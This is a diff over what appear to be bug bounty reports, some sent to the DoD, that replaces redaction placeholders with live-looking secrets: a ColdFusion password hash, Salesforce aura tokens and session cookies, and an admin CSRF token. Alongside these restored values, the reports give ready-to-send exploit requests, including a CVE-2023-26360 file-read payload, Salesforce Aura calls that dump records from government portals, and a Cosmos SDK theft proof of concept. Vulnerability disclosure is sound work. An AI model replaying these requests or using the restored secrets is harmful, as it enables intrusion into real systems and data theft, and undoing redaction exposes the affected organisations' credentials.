@@ -78,7 +78,7 @@ The Revive Adserver `tracker-delete.php` script was not properly checking owners
 
 Hi DOD,
 
-I have found CVE-2023-26360 in ███. It leads to an Unauthenticated Arbitrary File Read vulnerability due to the de serialization of untrusted data in Adobe ColdFusion. The password **hash** is disclosed: `password=[REDACTED_SECRET]`
+I have found CVE-2023-26360 in ███. It leads to an Unauthenticated Arbitrary File Read vulnerability due to the de serialization of untrusted data in Adobe ColdFusion. The password **hash** is disclosed: `password=1B3C0648D519755588B7CE5BDBFD4A88E6C7998AF32309665E6966932720F3BA`
 
 
 ## References
@@ -111,7 +111,7 @@ Accept-Encoding: gzip, deflate, br
 
 _variables=%7b%22_metadata%22%3a%7b%22classname%22%3a%22i/../lib/password.properties%22%7d%2c%22_variables%22%3a%5b%5d%7d
 ```
-3. The password hash is disclosed in the response: `password=[REDACTED_SECRET]`
+3. The password hash is disclosed in the response: `password=1B3C0648D519755588B7CE5BDBFD4A88E6C7998AF32309665E6966932720F3BA`
 
 ## POC Video
 
@@ -185,9 +185,9 @@ High impact/scale personal data leak.
 2. After logging in, find any POST request to the /s/sfsites/aura endpoint - aura.token will be present, as below. Send this to Repeater.
 
 ```
-POST /s/sfsites/aura?r=19&[REDACTED_SECRET].Quarterback.getAllowedPostMessageOrigins=1 HTTP/2
+POST /s/sfsites/aura?r=19&ui-comm-runtime-components-aura-components-siteforce-qb.Quarterback.getAllowedPostMessageOrigins=1 HTTP/2
 Host: ███████
-Cookie: renderCtx=%7B%22pageId%22%3A%224c254d1c-8f54-44e6-8f93-434d123e1f6f%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%22ae182506-2403-4c3c-8d77-69462fcc6184%22%2C%22audienceIds%22%3A%22%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; OptanonConsent=isGpcEnabled=1&datestamp=Fri+Jan+31+2025+15%3A40%3A52+GMT%2B0000+(Greenwich+Mean+Time)&version=202212.1.0&isIABGlobal=false&hosts=&landingPath=https%3A%2F%2F████%2Fapply-now&groups=C0001%3A1%2CC0003%3A1%2CSPD_BG%3A0%2CC0004%3A0%2CC0002%3A0; [REDACTED_SECRET]=irl1; [REDACTED_SECRET]=[REDACTED_SECRET]; AMCV_9A3A4AEA5C01FFA90A495EEF%40AdobeOrg=MCMID|[REDACTED_SECRET]; ak_bmsc=[REDACTED_SECRET]~000000000000000000000000000000~[REDACTED_SECRET]+RU5U6Jpe30Q9bQIv7U16JHfN+qev9NrCZ4NRhVUL3hv+SqVvQKflFUzk056OHlM27ZOL5G/[REDACTED_SECRET]+aY2fkKKg26of33bm+[REDACTED_SECRET]+vPaTTqHcghtqkZ4iNE814+[REDACTED_SECRET]==; force-stream=!X2xQYLyIEeQ3rwu/bH3rPvwlR4HtllixEFFMt993L5YN/Af4vO8mOk1mKP9i8bLU59n3umKTH+W8uEY=; bm_sv=[REDACTED_SECRET]~[REDACTED_SECRET]+[REDACTED_SECRET]+2x/[REDACTED_SECRET]/qND~1; oinfo=[REDACTED_SECRET]==; autocomplete=1; sid=00Do0000000airF!ARYAQIIfL2JihCfL8Vuo98N.[REDACTED_SECRET]; sid_Client=3000000gDzP0000000airF; clientSrc=███████; inst=APP_83; oid=00Do0000000airF; __Secure-has-sid=1; _ga_EYFLELGKGE=GS1.1.1738338117.1.1.1738338404.0.0.1518876090; _ga=GA1.1.1505934370.1738338118
+Cookie: renderCtx=%7B%22pageId%22%3A%224c254d1c-8f54-44e6-8f93-434d123e1f6f%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%22ae182506-2403-4c3c-8d77-69462fcc6184%22%2C%22audienceIds%22%3A%22%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; OptanonConsent=isGpcEnabled=1&datestamp=Fri+Jan+31+2025+15%3A40%3A52+GMT%2B0000+(Greenwich+Mean+Time)&version=202212.1.0&isIABGlobal=false&hosts=&landingPath=https%3A%2F%2F████%2Fapply-now&groups=C0001%3A1%2CC0003%3A1%2CSPD_BG%3A0%2CC0004%3A0%2CC0002%3A0; kndctr_9A3A4AEA5C01FFA90A495EEF_AdobeOrg_cluster=irl1; kndctr_9A3A4AEA5C01FFA90A495EEF_AdobeOrg_identity=CiYyMjc1MDM1Mzg1MzA0ODYwNzU5MDU0NTEwMzcxMzY2NDgwODY3NFITCOiBl-jLMhABGAEqBElSTDEwAPAB6IGX6Msy; AMCV_9A3A4AEA5C01FFA90A495EEF%40AdobeOrg=MCMID|22750353853048607590545103713664808674; ak_bmsc=B3E04778E36F4D7131079F5F4CB99768~000000000000000000000000000000~YAAQlrEXAnWwm5uUAQAAjAMGvRqcyA6e25MMo39CGW5l5wzdYui+RU5U6Jpe30Q9bQIv7U16JHfN+qev9NrCZ4NRhVUL3hv+SqVvQKflFUzk056OHlM27ZOL5G/jLiszcfiZqJ1NudMye8eLC4MPX7ENXPCYLjcKe1nC+aY2fkKKg26of33bm+VdyqM2UHBK4veL53A4By37Ou7fgS2ruOHTKREd0su3Ll6TABihtTrlvzbmMsbxR96TMY+vPaTTqHcghtqkZ4iNE814+kFakHX2yWPor9dVXJVOrTVHQbBnqem9n5xmOYpfkGe6hnjx30gNsddMmGkE4OIVkIQnF5BaEed3AvNSEHWkI65Q0FPsKdd80g4TU7GQN9qfnsYUICdlpJYyuYpR12Wr9w==; force-stream=!X2xQYLyIEeQ3rwu/bH3rPvwlR4HtllixEFFMt993L5YN/Af4vO8mOk1mKP9i8bLU59n3umKTH+W8uEY=; bm_sv=5CBA1975D035E99E5348E5BDA6FAB31E~YAAQorEXAkgMsbmUAQAAIxILvRqbqnYRcsZWXhwqtWsMi0vgOnQXhFzocmVM0N3UEYxteCab3LrEKOOwLD08oEK6X0nTsIAfONzth2bGw4w+eeG2yt5sOm4MePK515uzhFSVyHDaf3LhIy5kUdM0xGhObUUYB6Pwe2GgwQmguLOhhS3cBMzFMACpW275+2x/kmWcK9JOyDo8FLnBqhHhM1OXjCpQzat6dEBZ7KEq6wm0MqYLE3e4ghGZEK1NreAE/qND~1; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRG8wMDAwMDAwYWlyRg==; autocomplete=1; sid=[REDACTED_SALESFORCE_TOKEN]; sid_Client=3000000gDzP0000000airF; clientSrc=███████; inst=APP_83; oid=00Do0000000airF; __Secure-has-sid=1; _ga_EYFLELGKGE=GS1.1.1738338117.1.1.1738338404.0.0.1518876090; _ga=GA1.1.1505934370.1738338118
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: */*
 Accept-Language: en-US,en;q=0.5
@@ -208,15 +208,15 @@ Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-origin
 Te: trailers
 
-message=%7B%22actions%22%3A%5B%7B%22id%22%3A%22127%3Ba%22%2C%22descriptor%22%3A%22serviceComponent%3A%2F%2Fui.comm.runtime.components.aura.components.siteforce.qb.QuarterbackController%2FACTION%24getAllowedPostMessageOrigins%22%2C%22callingDescriptor%22%3A%22UNKNOWN%22%2C%22params%22%3A%7B%7D%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%[REDACTED_SECRET]%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AembeddedServiceSidebar%22%3A%221154_bQKJgTrtOZCM43YoejcSFg%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%22343_75unE-CE7CDfRvzL8FM_Uw%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2F&aura.token=[REDACTED_SECRET]%3D..[REDACTED_SECRET]%3D
+message=%7B%22actions%22%3A%5B%7B%22id%22%3A%22127%3Ba%22%2C%22descriptor%22%3A%22serviceComponent%3A%2F%2Fui.comm.runtime.components.aura.components.siteforce.qb.QuarterbackController%2FACTION%24getAllowedPostMessageOrigins%22%2C%22callingDescriptor%22%3A%22UNKNOWN%22%2C%22params%22%3A%7B%7D%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AembeddedServiceSidebar%22%3A%221154_bQKJgTrtOZCM43YoejcSFg%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%22343_75unE-CE7CDfRvzL8FM_Uw%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2F&aura.token=eyJub25jZSI6InRrRzVUQXR4dE9LSm9JOWRMSWRQOEFoWkh5aTVqVkl2UzRmb3l1UTRfVzhcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRDgzMDAwMDAwOGFIdVwiLFwidlwiOlwiMDJHODMwMDAwMDAwWXFYXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzgzMzg0MDQ2MjEsImV4cCI6MH0%3D..Z1upK8NszMzEbG7Y1USAsP1mvkFcsH4jy0rok3V_xpA%3D
 ```
 
 3. Modify the request as below and send. This will call 2000 Document records (none of the ones listed in the response are sensitive).
 
 ```
-POST /s/sfsites/aura?r=19&[REDACTED_SECRET].Quarterback.getAllowedPostMessageOrigins=1 HTTP/2
+POST /s/sfsites/aura?r=19&ui-comm-runtime-components-aura-components-siteforce-qb.Quarterback.getAllowedPostMessageOrigins=1 HTTP/2
 Host: ███
-Cookie: renderCtx=%7B%22pageId%22%3A%224c254d1c-8f54-44e6-8f93-434d123e1f6f%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%22ae182506-2403-4c3c-8d77-69462fcc6184%22%2C%22audienceIds%22%3A%22%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; OptanonConsent=isGpcEnabled=1&datestamp=Fri+Jan+31+2025+15%3A40%3A52+GMT%2B0000+(Greenwich+Mean+Time)&version=202212.1.0&isIABGlobal=false&hosts=&landingPath=https%3A%2F%2F██████████%2Fapply-now&groups=C0001%3A1%2CC0003%3A1%2CSPD_BG%3A0%2CC0004%3A0%2CC0002%3A0; [REDACTED_SECRET]=irl1; [REDACTED_SECRET]=[REDACTED_SECRET]; AMCV_9A3A4AEA5C01FFA90A495EEF%40AdobeOrg=MCMID|[REDACTED_SECRET]; ak_bmsc=[REDACTED_SECRET]~000000000000000000000000000000~[REDACTED_SECRET]+RU5U6Jpe30Q9bQIv7U16JHfN+qev9NrCZ4NRhVUL3hv+SqVvQKflFUzk056OHlM27ZOL5G/[REDACTED_SECRET]+aY2fkKKg26of33bm+[REDACTED_SECRET]+vPaTTqHcghtqkZ4iNE814+[REDACTED_SECRET]==; force-stream=!X2xQYLyIEeQ3rwu/bH3rPvwlR4HtllixEFFMt993L5YN/Af4vO8mOk1mKP9i8bLU59n3umKTH+W8uEY=; bm_sv=[REDACTED_SECRET]~[REDACTED_SECRET]+[REDACTED_SECRET]+2x/[REDACTED_SECRET]/qND~1; oinfo=[REDACTED_SECRET]==; autocomplete=1; sid=00Do0000000airF!ARYAQIIfL2JihCfL8Vuo98N.[REDACTED_SECRET]; sid_Client=3000000gDzP0000000airF; clientSrc=████; inst=APP_83; oid=00Do0000000airF; __Secure-has-sid=1; _ga_EYFLELGKGE=GS1.1.1738338117.1.1.1738338404.0.0.1518876090; _ga=GA1.1.1505934370.1738338118
+Cookie: renderCtx=%7B%22pageId%22%3A%224c254d1c-8f54-44e6-8f93-434d123e1f6f%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%22ae182506-2403-4c3c-8d77-69462fcc6184%22%2C%22audienceIds%22%3A%22%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; OptanonConsent=isGpcEnabled=1&datestamp=Fri+Jan+31+2025+15%3A40%3A52+GMT%2B0000+(Greenwich+Mean+Time)&version=202212.1.0&isIABGlobal=false&hosts=&landingPath=https%3A%2F%2F██████████%2Fapply-now&groups=C0001%3A1%2CC0003%3A1%2CSPD_BG%3A0%2CC0004%3A0%2CC0002%3A0; kndctr_9A3A4AEA5C01FFA90A495EEF_AdobeOrg_cluster=irl1; kndctr_9A3A4AEA5C01FFA90A495EEF_AdobeOrg_identity=CiYyMjc1MDM1Mzg1MzA0ODYwNzU5MDU0NTEwMzcxMzY2NDgwODY3NFITCOiBl-jLMhABGAEqBElSTDEwAPAB6IGX6Msy; AMCV_9A3A4AEA5C01FFA90A495EEF%40AdobeOrg=MCMID|22750353853048607590545103713664808674; ak_bmsc=B3E04778E36F4D7131079F5F4CB99768~000000000000000000000000000000~YAAQlrEXAnWwm5uUAQAAjAMGvRqcyA6e25MMo39CGW5l5wzdYui+RU5U6Jpe30Q9bQIv7U16JHfN+qev9NrCZ4NRhVUL3hv+SqVvQKflFUzk056OHlM27ZOL5G/jLiszcfiZqJ1NudMye8eLC4MPX7ENXPCYLjcKe1nC+aY2fkKKg26of33bm+VdyqM2UHBK4veL53A4By37Ou7fgS2ruOHTKREd0su3Ll6TABihtTrlvzbmMsbxR96TMY+vPaTTqHcghtqkZ4iNE814+kFakHX2yWPor9dVXJVOrTVHQbBnqem9n5xmOYpfkGe6hnjx30gNsddMmGkE4OIVkIQnF5BaEed3AvNSEHWkI65Q0FPsKdd80g4TU7GQN9qfnsYUICdlpJYyuYpR12Wr9w==; force-stream=!X2xQYLyIEeQ3rwu/bH3rPvwlR4HtllixEFFMt993L5YN/Af4vO8mOk1mKP9i8bLU59n3umKTH+W8uEY=; bm_sv=5CBA1975D035E99E5348E5BDA6FAB31E~YAAQorEXAkgMsbmUAQAAIxILvRqbqnYRcsZWXhwqtWsMi0vgOnQXhFzocmVM0N3UEYxteCab3LrEKOOwLD08oEK6X0nTsIAfONzth2bGw4w+eeG2yt5sOm4MePK515uzhFSVyHDaf3LhIy5kUdM0xGhObUUYB6Pwe2GgwQmguLOhhS3cBMzFMACpW275+2x/kmWcK9JOyDo8FLnBqhHhM1OXjCpQzat6dEBZ7KEq6wm0MqYLE3e4ghGZEK1NreAE/qND~1; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRG8wMDAwMDAwYWlyRg==; autocomplete=1; sid=[REDACTED_SALESFORCE_TOKEN]; sid_Client=3000000gDzP0000000airF; clientSrc=████; inst=APP_83; oid=00Do0000000airF; __Secure-has-sid=1; _ga_EYFLELGKGE=GS1.1.1738338117.1.1.1738338404.0.0.1518876090; _ga=GA1.1.1505934370.1738338118
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: */*
 Accept-Language: en-US,en;q=0.5
@@ -237,7 +237,7 @@ Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-origin
 Te: trailers
 
-message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Document","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%[REDACTED_SECRET]%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AembeddedServiceSidebar%22%3A%221154_bQKJgTrtOZCM43YoejcSFg%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%22343_75unE-CE7CDfRvzL8FM_Uw%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2F&aura.token=[REDACTED_SECRET]%3D..[REDACTED_SECRET]%3D
+message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Document","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AembeddedServiceSidebar%22%3A%221154_bQKJgTrtOZCM43YoejcSFg%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%22343_75unE-CE7CDfRvzL8FM_Uw%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2F&aura.token=eyJub25jZSI6InRrRzVUQXR4dE9LSm9JOWRMSWRQOEFoWkh5aTVqVkl2UzRmb3l1UTRfVzhcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRDgzMDAwMDAwOGFIdVwiLFwidlwiOlwiMDJHODMwMDAwMDAwWXFYXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzgzMzg0MDQ2MjEsImV4cCI6MH0%3D..Z1upK8NszMzEbG7Y1USAsP1mvkFcsH4jy0rok3V_xpA%3D
 ```
 4. Extract one of the IDs from the response, e.g 015t0000000m7QgAAI.
 
@@ -525,7 +525,7 @@ The Change E-mail UI requires the current password, but the admin panel endpoint
 ██████
 3. Navigate to Inventory → User Access, select the admin user, and click Save changes while intercepting the request.
 4. Modify and send the following request:
-`submit=1&login=admin&token=[REDACTED_SECRET]&userid=1&email_address=another-mail@example.com&agencyid=1`
+`submit=1&login=admin&token=ba6ff2f70a69a509d5bcc84cb2225517&userid=1&email_address=another-mail@example.com&agencyid=1`
 
 {F4929064}
 5. Observe that the admin user’s email is successfully updated without password confirmation.
@@ -998,17 +998,17 @@ This turns a potentially moderate-risk SSRF flaw into a critical internal networ
 **Vulnerability Information:**
 
 ### Summary of Impact
-An attacker can transfer money from the locking account they don't own(if the account has unlocked funds, can be after locking period is over). The POC is done for `periodic-locking-account`. But it seems like more locking accounts are affected because the issue seems to be in [SendCoins](https://github.com/cosmos/cosmos-sdk/blob/[REDACTED_SECRET]/x/accounts/defaults/lockup/lockup.go#L285-L284).  And it's used by all of them. When it calls the function it passes sender from the message `msg.Sender` in [checkSender](https://github.com/cosmos/cosmos-sdk/blob/[REDACTED_SECRET]/x/accounts/defaults/lockup/lockup.go#L333) it checks that the sender == owner. But the issue here is that msg.Sender is not validated anywhere bc this message is packed into [MsgExecute](https://github.com/cosmos/cosmos-sdk/blob/[REDACTED_SECRET]/api/cosmos/accounts/v1/tx.pulsar.go#L4444-L4443).  While executing it sets original sender into the [context ](https://github.com/cosmos/cosmos-sdk/blob/[REDACTED_SECRET]/x/accounts/keeper.go#L284). And in case of multisig account it correctly takes it from [ctx](https://github.com/cosmos/cosmos-sdk/blob/[REDACTED_SECRET]/x/accounts/defaults/multisig/account.go#L168) . At least in those places I looked at. But these locking accounts take it from the message. And it can be anything. 
+An attacker can transfer money from the locking account they don't own(if the account has unlocked funds, can be after locking period is over). The POC is done for `periodic-locking-account`. But it seems like more locking accounts are affected because the issue seems to be in [SendCoins](https://github.com/cosmos/cosmos-sdk/blob/7e391959b9aebf055294b24b7f392346709dae64/x/accounts/defaults/lockup/lockup.go#L285-L284).  And it's used by all of them. When it calls the function it passes sender from the message `msg.Sender` in [checkSender](https://github.com/cosmos/cosmos-sdk/blob/7e391959b9aebf055294b24b7f392346709dae64/x/accounts/defaults/lockup/lockup.go#L333) it checks that the sender == owner. But the issue here is that msg.Sender is not validated anywhere bc this message is packed into [MsgExecute](https://github.com/cosmos/cosmos-sdk/blob/7e391959b9aebf055294b24b7f392346709dae64/api/cosmos/accounts/v1/tx.pulsar.go#L4444-L4443).  While executing it sets original sender into the [context ](https://github.com/cosmos/cosmos-sdk/blob/7e391959b9aebf055294b24b7f392346709dae64/x/accounts/keeper.go#L284). And in case of multisig account it correctly takes it from [ctx](https://github.com/cosmos/cosmos-sdk/blob/7e391959b9aebf055294b24b7f392346709dae64/x/accounts/defaults/multisig/account.go#L168) . At least in those places I looked at. But these locking accounts take it from the message. And it can be anything. 
 
 #### POC scenario
 
-1. We first create a periodic-locking-account at  the [victim ](https://gist.github.com/unknownfeature/[REDACTED_SECRET]#file-main-rs-L28). Locking period is small so we wouldn't wait long.
-2. Then we wait for locking period to end and transfer money to the [attacker](https://gist.github.com/unknownfeature/[REDACTED_SECRET]#file-main-rs-L55)
+1. We first create a periodic-locking-account at  the [victim ](https://gist.github.com/unknownfeature/d0b8cfcf263904d9be4707dded38c706#file-main-rs-L28). Locking period is small so we wouldn't wait long.
+2. Then we wait for locking period to end and transfer money to the [attacker](https://gist.github.com/unknownfeature/d0b8cfcf263904d9be4707dded38c706#file-main-rs-L55)
 
 ### Steps to Reproduce
 Go and Rust required
 
-1. Checkout latest version of [cosmos-sdk](https://github.com/cosmos/cosmos-sdk) and run `make build`. Note the path to binariy and when it's done replace the path [in setup_chain](https://gist.github.com/unknownfeature/[REDACTED_SECRET]#file-setup_chain-L18).
+1. Checkout latest version of [cosmos-sdk](https://github.com/cosmos/cosmos-sdk) and run `make build`. Note the path to binariy and when it's done replace the path [in setup_chain](https://gist.github.com/unknownfeature/d0b8cfcf263904d9be4707dded38c706#file-setup_chain-L18).
 
  2. Create rust project with attached `Cargo.toml`.  Download all attached *.rs files and put them into `src` folder.
 
@@ -1428,9 +1428,9 @@ High-impact sensitive data leak.
 3. After changing the password and logging into ██████.mil/Portal████/s/, find any POST request with aura.token present in the HTTP traffic, e.g:
 
 ```
-POST /Portal████████/s/sfsites/aura?r=1&[REDACTED_SECRET].PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
+POST /Portal████████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
 Host: █████.mil
-Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=[REDACTED_SECRET]==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn![REDACTED_SECRET]; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
+Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=[REDACTED_SALESFORCE_TOKEN]; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: */*
 Accept-Language: en-US,en;q=0.5
@@ -1450,15 +1450,15 @@ Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-origin
 Te: trailers
 
-message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2294%3Ba%22%2C%22descriptor%22%3A%22serviceComponent%3A%2F%2Fui.comm.runtime.components.aura.components.siteforce.controller.[REDACTED_SECRET]%2FACTION%24getComponentAttributes%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2Fsiteforce%3ApageLoader%22%2C%22params%22%3A%7B%22viewOrThemeLayoutId%22%3A%22c2a69af8-e08e-4cc8-a677-d55b0ca0fa94%22%2C%22publishedChangelistNum%22%3A91%2C%22audienceKey%22%3A%22ClyOkxQ47tauZ_s9udPOFA%22%7D%2C%22version%22%3A%2262.0%22%2C%22storable%22%3Atrue%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%[REDACTED_SECRET]%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal██████%2Fs%2F&aura.token=[REDACTED_SECRET]%3D..[REDACTED_SECRET]%3D
+message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2294%3Ba%22%2C%22descriptor%22%3A%22serviceComponent%3A%2F%2Fui.comm.runtime.components.aura.components.siteforce.controller.PubliclyCacheableAttributeLoaderController%2FACTION%24getComponentAttributes%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2Fsiteforce%3ApageLoader%22%2C%22params%22%3A%7B%22viewOrThemeLayoutId%22%3A%22c2a69af8-e08e-4cc8-a677-d55b0ca0fa94%22%2C%22publishedChangelistNum%22%3A91%2C%22audienceKey%22%3A%22ClyOkxQ47tauZ_s9udPOFA%22%7D%2C%22version%22%3A%2262.0%22%2C%22storable%22%3Atrue%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal██████%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D
 ```
 
 4. Send the request to Repeater, modify as below and send. This will pull some info from your own Contact record. Save the Contact Id (003Rw000002SJcsIAG in my case)
 
 ```
-POST /Portal█████/s/sfsites/aura?r=1&[REDACTED_SECRET].PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
+POST /Portal█████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
 Host: █████.mil
